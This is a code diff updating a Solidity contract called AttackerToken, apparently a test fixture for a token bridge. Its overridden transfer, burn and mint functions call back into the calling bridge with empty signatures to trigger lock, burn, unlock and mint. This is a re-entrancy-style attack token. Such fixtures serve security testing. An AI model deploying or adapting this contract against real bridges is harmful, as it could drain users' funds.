@@ -17,51 +17,35 @@ contract AttackerToken is Token {
         address to,
         uint256 amount
     ) public virtual override returns (bool) {
-        IBridge.DepositData memory _depositData = IBridge.DepositData(
+        IBridge.Signature memory _signature = IBridge.Signature(0, 0, "", "");
+        IBridge(msg.sender).lock(
             to,
             address(this),
-            msg.sender,
             amount,
-            1
+            _signature
         );
-        IBridge.Signature memory _signature = IBridge.Signature(0, "", "");
-        IBridge(msg.sender).lock(_depositData, _signature);
         return true;
     }
 
     function burnFrom(address account, uint256 amount) public virtual override {
-        IBridge.DepositData memory _depositData = IBridge.DepositData(
+        IBridge.Signature memory _signature = IBridge.Signature(0, 0, "", "");
+        IBridge(msg.sender).burn(
             account,
             address(this),
-            msg.sender,
             amount,
-            1
+            _signature
         );
-        IBridge.Signature memory _signature = IBridge.Signature(0, "", "");
-        IBridge(msg.sender).burn(_depositData, _signature);
     }
 
     function transfer(
         address to,
         uint256 amount
     ) public virtual override returns (bool) {
-        IBridge.WithdrawData memory _withdrawData = IBridge.WithdrawData(
-            address(this),
-            "WShark",
-            "WShark",
-            amount
-        );
-        IBridge(msg.sender).unlock(_withdrawData);
+        IBridge(msg.sender).unlock(address(this), amount);
         return true;
     }
 
     function mint(address to, uint256 amount) external override {
-        IBridge.WithdrawData memory _withdrawData = IBridge.WithdrawData(
-            address(this),
-            "WShark",
-            "WShark",
-            amount
-        );
-        IBridge(msg.sender).mint(_withdrawData);
+        IBridge(msg.sender).mint(address(this), "WShark", "WShark", amount);
     }
 }
